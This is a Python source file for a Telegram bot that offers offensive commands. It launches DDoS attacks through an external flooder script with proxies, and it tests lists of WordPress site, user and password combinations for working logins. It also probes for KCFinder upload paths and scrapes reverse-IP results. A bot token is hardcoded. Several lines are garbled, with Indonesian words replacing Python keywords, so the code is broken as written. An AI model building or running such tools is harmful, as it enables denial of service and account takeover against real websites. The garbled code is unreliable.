import logging
from telegram import Update, InputFile
from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext
from telegram.ext.filters import Filters
import requests
from bs4 import BeautifulSoup
import subprocess
import os
import time

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Your bot token
TOKEN = '6674838409:AAHLkaUy93k648M8FlvlhBddJLD0NgfzYd0'

# Variable to track if DDoS is running
ddos_running = False

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Hi! Use /subdomain <url>, /reverseip <IP>, /wpcek <file>, /dapacek <url>, /ddos <url>, or /kcfinder <url> to use the features.')

def subdomain(update: Update, context: CallbackContext) -> None:
    url = context.args[0]
    subdomains = find_subdomains(url)
    response = "\n".join(subdomains)
    update.message.reply_text(f"Subdomains for {url}:\n\n{response}")

def reverse_ip(update: Update, context: CallbackContext) -> None:
    ip = context.args[0]
    domains = find_domains_by_ip(ip)
    response = "\n".join(domains)
    update.message.reply_text(f"Domains for {ip}:\n\n{response}")

def wpcek(update: Update, context: CallbackContext) -> None:
    file = update.message.document.get_file()
    file.download('targets.txt')
    results = check_wordpress_logins('targets.txt')
    response = "\n".join(results)
    update.message.reply_text(response)

def dapacek(update: Update, context: CallbackContext) -> None:
    url = context.args[0]
    da, pa = check_da_pa(url)
    response = f"DA and PA for {url}:\n\nDA: {da}\nPA: {pa}"
    update.message.reply_text(response)

def ddos(update: Update, context: CallbackContext) -> None:
    global ddos_running
    if ddos_running:
        update.message.reply_text("Another DDoS attack is already running. Please wait until it finishes.")
        return
    
    url = context.args[0]
    ddos_running = True
    update.message.reply_text(f"Starting DDoS attack on {url}...")
    
    try:
        result = run_ddos(url)
        update.message.reply_text(result)
    finally:
        ddos_running = False

def kcfinder(update: Update, context: CallbackContext) -> None:
    url = context.args[0]
    paths = load_paths('path.txt')
    results = check_kcfinder(url, paths, update, context)
    response = "\n".join(results)
    update.message.reply_text(f"KCFinder paths for {url}:\n\n{response}")

def load_paths(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def check_kcfinder(url, paths, update, context):
    results = []
    total_paths = len(paths)
    for i, path in enumerate(paths):
        full_url = f"{url}/{path}"
        response = requests.get(full_url)
        if response.status_code == 200:
            results.append(full_url)
        
        # Update progress
        progress = int(((i + 1) / total_paths) * 100)
        update.message.reply_text(f"Proses {progress}%")

        # Sleep to simulate delay (remove or adjust in real implementation)
        time.sleep(1)
    
    return results

def find_subdomains(url):
    # Placeholder function
    return ["sub1." + url, "sub2." + url]

def find_domains_by_ip(ip):
    url = f"https://hackertarget.com/reverse-ip-lookup/"
    response = requests.post(url, data={'theinput': ip, 'thetest': 'reverseiplookup', 'name_of_nonce_field': '0c5f4d60e5'})
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        results = soup.find('pre', {'class': 'query-output'})
        if results:
            return results.text.strip().split('\n')
    return ["No results found or CAPTCHA is present"]

def check_wordpress_logins(file_path):
    results = []
    with open(file_path, 'r') as file:
        targets = file.readlines()
        for target in targets:
            target = target.strip()
            if target:
                result = try_login(target)
                results.append(result)
    return results

def try_login(asuna):
    site = asuna.split('|')[0]
    user = asuna.split('|')[1]
    pasw = asuna.split('|')[2]
    hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/83.0.4103.101 Safari/537.36'}
    r = requests.Session()
    try:
        cek = r.get(site, headers=hd, timeout=10)
        if cek.status_code == 200 or cek.status_code == 403 atau 'Powered by WordPress' dalam cek.text atau '/wp-login.php' dalam cek.text:
            login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10)
            jika 'wp-admin/profile.php' dalam login.text atau 'Found' dalam login.text atau '/wp-admin' dalam login.text:
                return f"{site}#{user}@{pasw} - Success"
            else:
                return f"{site}#{user}@{pasw} - Failed"
        else:
            return f"{site}#{user}@{pasw} - Not a WordPress site or inaccessible"
    kecuali Exception sebagai e:
        return f"{site}#{user}@{pasw} - Error: {str(e)}"

def check_da_pa(url):
    site_url = 'https://www.prepostseo.com/id/domain-authority-checker'
    session = requests.Session()
    response = session.get(site_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'csrf_test_name'})['value']
    
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/91.0.4472.124 Safari/537.36'}
    data = {'domain': url, 'csrf_test_name': token}
    
    jika response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        results = soup.find_all('div', {'class': 'result-area'})
        da = pa = 'Not found'
        for result in results:
            if 'Domain Authority' in result.text:
                da = result.find('span', {'class': 'value'}).text.strip()
            if 'Page Authority' in result.text:
                pa = result.find('span', {'class': 'value'}).text.strip()
        return da, pa
    else:
        return 'Error', 'Error'

def run_ddos(url):
    try:
        result = subprocess.run(['node', 'SUPER.js', url, '90', '9', '5', 'proxy.txt'], capture_output=True, text=True)
        return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
    except Exception as e:
        return f"Failed to run DDoS: {str(e)}"

def main() -> None:
    """Start the bot."""
    updater = Updater(TOKEN)

    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("subdomain", subdomain))
    dispatcher.add_handler(CommandHandler("reverseip", reverse_ip))
    dispatcher.add_handler(CommandHandler("dapacek", dapacek))
    dispatcher.add_handler(CommandHandler("ddos", ddos))
    dispatcher.add_handler(CommandHandler("kcfinder", kcfinder))
    dispatcher.add_handler(MessageHandler(Filters.document.file_extension("txt"), wpcek))

    updater.start_polling()

    updater.idle()

if __name__ == '__main__':
    main()